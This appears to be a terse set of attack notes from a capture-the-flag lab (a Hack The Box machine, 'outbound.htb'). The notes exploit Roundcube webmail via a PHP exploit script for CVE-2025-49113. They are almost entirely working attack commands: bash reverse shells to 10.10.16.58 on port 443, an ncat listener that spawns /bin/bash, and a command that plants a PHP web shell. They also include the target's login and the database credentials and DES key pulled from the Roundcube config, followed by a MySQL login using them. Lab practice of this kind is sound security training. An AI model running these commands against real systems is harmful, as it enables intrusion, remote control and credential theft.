```bash
"bash -c 'bash -i >&/dev/tcp/10.10.16.58/443 0>&1'"
"ncat -nlvp 443 -e /bin/bash"

php CVE-2025-49113.php http://<target_ip>/webmail/ <username> <password> "bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1"

php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"

#!/bin/bash

bash -i >& /dev/tcp/10.10.16.58/443 0>&1

# Config files from /var/www/html/roundcube/config/config.inc.php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

mysql -u roundcube -pRCDBPass2025 -h localhost roundcube



```